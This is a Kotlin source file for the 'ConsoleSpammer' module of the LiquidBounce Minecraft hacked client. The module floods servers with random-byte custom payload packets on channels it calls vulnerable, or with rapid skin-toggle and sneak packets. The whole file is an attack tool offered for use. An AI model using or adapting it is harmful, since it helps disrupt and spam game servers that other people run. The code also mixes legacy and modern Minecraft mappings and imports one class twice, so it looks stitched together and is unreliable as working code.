/*
 * LiquidBounce Hacked Client
 * A free open source mixin-based injection hacked client for Minecraft using Minecraft Forge.
 * https://github.com/CCBlueX/LiquidBounce/
 */
package net.ccbluex.liquidbounce.features.module.modules.exploit

import io.netty.buffer.Unpooled
import net.ccbluex.liquidbounce.event.EventTarget
import net.ccbluex.liquidbounce.event.UpdateEvent
import net.ccbluex.liquidbounce.event.WorldEvent
import net.ccbluex.liquidbounce.features.module.Module
import net.ccbluex.liquidbounce.features.module.Category
import net.ccbluex.liquidbounce.utils.PacketUtils.sendPacket
import net.ccbluex.liquidbounce.utils.PacketUtils.sendPackets
import net.ccbluex.liquidbounce.utils.misc.RandomUtils.nextInt
import net.ccbluex.liquidbounce.utils.timing.MSTimer
import net.ccbluex.liquidbounce.value.IntegerValue
import net.ccbluex.liquidbounce.value.ListValue
import net.minecraft.client.render.entity.PlayerModelPart
import net.minecraft.entity.player.EnumPlayerModelParts
import net.minecraft.network.PacketBuffer
import net.minecraft.network.packet.c2s.play.CustomPayloadC2SPacket
import net.minecraft.network.packet.c2s.play.ClientCommandC2SPacket
import net.minecraft.network.packet.c2s.play.ClientCommandC2SPacket.Action.START_SNEAKING
import net.minecraft.network.packet.c2s.play.ClientCommandC2SPacket.Action.STOP_SNEAKING
import net.minecraft.network.packet.c2s.play.CustomPayloadC2SPacket
import kotlin.random.Random.Default.nextBoolean
import kotlin.random.Random.Default.nextBytes

object ConsoleSpammer : Module("ConsoleSpammer", Category.EXPLOIT, subjective = true, hideModule = false) {

    private val mode by ListValue("Mode", arrayOf("Payload", "MineSecure"), "Payload")
    private val delay by IntegerValue("Delay", 0, 0..500)

    private val payload = PacketBuffer(Unpooled.buffer())
    private val vulnerableChannels = arrayOf("MC|BEdit", "MC|BSign", "MC|TrSel", "MC|PickItem")
    private val timer = MSTimer()

    init {
        val rawPayload = ByteArray(nextInt(endExclusive = 128))
        nextBytes(rawPayload)
        payload.writeBytes(rawPayload)
    }

    @EventTarget
    fun onUpdate(event: UpdateEvent) {
        if (!timer.hasTimePassed(delay))
            return

        when (mode.lowercase()) {
            "payload" -> sendPacket(CustomPayloadC2SPacket(vulnerableChannels.random(), payload))
            "minesecure" -> {
                mc.options.setPlayerModelPart(PlayerModelPart.HAT, nextBoolean())
                mc.options.setPlayerModelPart(PlayerModelPart.JACKET, nextBoolean())
                mc.options.setPlayerModelPart(PlayerModelPart.LEFT_PANTS_LEG, nextBoolean())
                mc.options.setPlayerModelPart(PlayerModelPart.RIGHT_PANTS_LEG, nextBoolean())
                mc.options.setPlayerModelPart(PlayerModelPart.LEFT_SLEEVE, nextBoolean())
                mc.options.setPlayerModelPart(PlayerModelPart.RIGHT_SLEEVE, nextBoolean())

                repeat(5) {
                    sendPackets(
                        ClientCommandC2SPacket(mc.player, STOP_SNEAKING),
                        ClientCommandC2SPacket(mc.player, START_SNEAKING)
                    )
                }
            }
        }
    }

    @EventTarget
    fun onWorld(event: WorldEvent) {
        if (event.worldClient == null) {
            state = false
        }
    }

}